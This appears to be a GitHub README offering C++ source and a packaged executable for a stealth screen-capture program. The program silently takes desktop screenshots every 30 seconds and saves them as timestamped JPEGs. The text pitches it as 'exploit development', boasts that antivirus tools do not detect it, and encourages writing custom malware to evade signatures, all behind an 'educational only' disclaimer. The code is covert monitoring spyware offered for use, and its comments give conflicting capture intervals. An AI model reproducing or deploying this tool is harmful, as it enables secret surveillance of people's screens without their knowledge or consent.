DISCLAIMER : OUR TOOLS ARE FOR EDUCATIONAL PURPOSES ONLY. DON'T USE THEM FOR ILLEGAL ACTIVITIES. YOU ARE THE ONLY RESPONSABLE FOR YOUR ACTIONS! OUR TOOLS ARE OPEN SOURCE WITH NO WARRANTY AND AS ARE.

## Exploit Development : Hidden Screen Catpure C++ (Stealth Mode) :

It is primary designed to be hidden and monitoring the computer activity. Take a screenshot of desktop in hidden mode using Visual C++ and save automatically to 'jpeg' file in every 30 second. 60+ Most Popular antivirus not detect this application while it is running on background.

### Why Programming Is Important for Hackers to Know :

Programming is an important skill that every self respecting hacker should master. here are some good examples of why it is important:

> <b>Building your own malware. </b>
When you program your own malware, there is no signature for it registered, thus making it pretty much impossible for AV software to detect.

> <b>Knowing how programs work will help you exploit them. </b>
though most exploit development is done in the assembly language in debuggers, knowing how a program works will help you exploit it faster.

> <b>Hacking tools are mostly open source. </b>
most hacking tools are open source, which means everyone can access the source code of said program. when you know how to program in the language the program is written, you can edit it and make it even better!

> <b>Making your own exploits. </b>
Though i recommend ruby & the Metasploit Framework for this purpose, ruby is still quite slow compared to C or C++. if you need your exploit to be fast, you can write it in C/C++.

i choose to make a series about C/C++ because C++ is a powerful language and is used in a lot of programs, like games. C is less powerfull but is still quite a low-level language, which means it interacts closely with the CPU. embedded devices are usually programmed in C aswell, from traffic lights to your microwave, will most likely run on some kind of software that is written in C.

### Prerequisites:

1. Microsoft Windows System
2. Visual Studio 2012

### Screenshot.zip (Files Included in Repo)

Contain Executable Version of Program. It run in Stealth Mode and Capture the Screenshot after 60 seconds of interval. Imaege name is based on Current System Time.

### Source Code :

```
#include <stdio.h>
#include <string>
#include <windows.h>
#include <wininet.h>
#include <winuser.h>
#include <conio.h>
#include <time.h>
#include <fstream>
#include <strsafe.h>
#include <io.h>
#include <crtdefs.h>
#include <fstream>
#include <GdiPlus.h>
#include <lmcons.h>

//char acUserName[100];

using namespace Gdiplus;
using namespace std;

fstream err("errormul.txt",ios::app);
fstream log_error_file("log_error.txt",ios::app);

#pragma comment(lib, "user32.lib") 
#pragma comment(lib,"Wininet.lib")
#pragma comment (lib,"gdiplus.lib")

void screenshot(string file){
	ULONG_PTR gdiplustoken;
	GdiplusStartupInput gdistartupinput;
	GdiplusStartupOutput gdistartupoutput;

	gdistartupinput.SuppressBackgroundThread = true;
	GdiplusStartup(& gdiplustoken,& gdistartupinput,& gdistartupoutput); //start GDI+

	HDC dc=GetDC(GetDesktopWindow());//get desktop content
	HDC dc2 = CreateCompatibleDC(dc);	 //copy context

	RECT rc0kno;  // rectangle  Object

	GetClientRect(GetDesktopWindow(),&rc0kno);// get desktop size;
	int w = rc0kno.right-rc0kno.left;//width
	int h = rc0kno.bottom-rc0kno.top;//height

	HBITMAP hbitmap = CreateCompatibleBitmap(dc,w,h);  //create bitmap
	HBITMAP holdbitmap = (HBITMAP) SelectObject(dc2,hbitmap);

	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);  //copy pixel from pulpit to bitmap
	Bitmap* bm= new Bitmap(hbitmap,NULL);

	UINT num;
	UINT size;

	ImageCodecInfo *imagecodecinfo;
	GetImageEncodersSize(&num,&size); //get count of codec

	imagecodecinfo = (ImageCodecInfo*)(malloc(size));
	GetImageEncoders (num,size,imagecodecinfo);//get codec

	CLSID clsidEncoder;

	for(int i=0; i < num; i++)
	{
		if(wcscmp(imagecodecinfo[i].MimeType,L"image/jpeg")==0)
			clsidEncoder = imagecodecinfo[i].Clsid;   //get jpeg codec id

	}

	free(imagecodecinfo);

	wstring ws;
	ws.assign(file.begin(),file.end());  //sring to wstring
	bm->Save(ws.c_str(),& clsidEncoder);   //save in jpeg format
	SelectObject(dc2,holdbitmap);  //Release Objects
	DeleteObject(dc2);
	DeleteObject(hbitmap);

	ReleaseDC(GetDesktopWindow(),dc);
	GdiplusShutdown(gdiplustoken);

}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int CmdShow)
{
	while(true){
	SYSTEMTIME st;  // create object of system time 
	GetLocalTime(&st);
	int year = st.wYear;  // extract year from system time
	int month = st.wMonth; // extract month from system time
	int day = st.wDay; // extract year day system time
	int hour = st.wHour; // extract year hours system time
	int mintue = st.wMinute; // extract mintue from system time

	string yearS =  to_string(year);
	yearS += "_";
	string monthS =  to_string(month);
	monthS += "-";
	string dayS =  to_string(day);
	dayS += "-";
	string hourS =  to_string(hour);
	hourS += "H-";
	string mintueS =  to_string(mintue);
	mintueS += "M.jpg";

	string startDate;
	startDate =dayS + monthS + yearS + hourS + mintueS;  // create complete string of date and time
	
	screenshot(startDate);   // send string to screenshot function
	Sleep(1000*30*1);  // delay execution of function 60 Seconds
	}
}

```
## Version

1.7

## Authors

Ajay Randhawa

## Donate
If you appreciate that, please consider donating to the Developer.

[![Donate](https://cdn.pbrd.co/images/HyQFKkP.png)](https://www.paypal.me/ajayrandhawa) 
